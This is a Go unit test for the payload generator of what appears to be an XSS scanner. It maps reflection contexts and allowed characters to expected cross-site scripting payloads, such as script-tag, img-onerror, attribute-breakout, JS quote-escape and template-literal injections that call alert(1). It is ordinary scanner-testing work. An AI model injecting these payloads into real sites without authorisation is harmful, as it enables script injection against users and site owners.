package payloads

import (
	"testing"

	"github.com/lcalzada-xor/xxss/v2/pkg/models"
)

func TestGeneratePayload(t *testing.T) {
	tests := []struct {
		name     string
		context  models.ReflectionContext
		allowed  []string
		expected string
	}{
		{
			name:     "HTML with < > /",
			context:  models.ContextHTML,
			allowed:  []string{"<", ">", "/"},
			expected: "<script>alert(1)</script>",
		},
		{
			name:     "HTML with < > = (no slash)",
			context:  models.ContextHTML,
			allowed:  []string{"<", ">", "="},
			expected: "<img src=x onerror=alert(1)>",
		},
		{
			name:     "Attribute Breakout",
			context:  models.ContextAttribute,
			allowed:  []string{"\"", ">", "<", "/"},
			expected: "\"><script>alert(1)</script>",
		},
		{
			name:     "Attribute Event Handler",
			context:  models.ContextAttribute,
			allowed:  []string{"\"", "=", " "},
			expected: "\" onmouseover=alert(1) x=\"",
		},
		{
			name:     "JS Single Quote",
			context:  models.ContextJSSingleQuote,
			allowed:  []string{"'", ";", "/"},
			expected: "';alert(1)//",
		},
		{
			name:     "JS Single Quote (No Slash)",
			context:  models.ContextJSSingleQuote,
			allowed:  []string{"'", ";"},
			expected: "';alert(1);'",
		},
		{
			name:     "Template Literal",
			context:  models.ContextTemplateLiteral,
			allowed:  []string{"`", "+"},
			expected: "`+alert(1)+`",
		},
		{
			name:     "Fallback to Polyglot",
			context:  models.ContextHTML,
			allowed:  []string{}, // Nothing allowed
			expected: GetDefaultPolyglot(),
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := GeneratePayload(tc.context, tc.allowed)
			if result != tc.expected {
				t.Errorf("Expected payload '%s', got '%s'", tc.expected, result)
			}
		})
	}
}
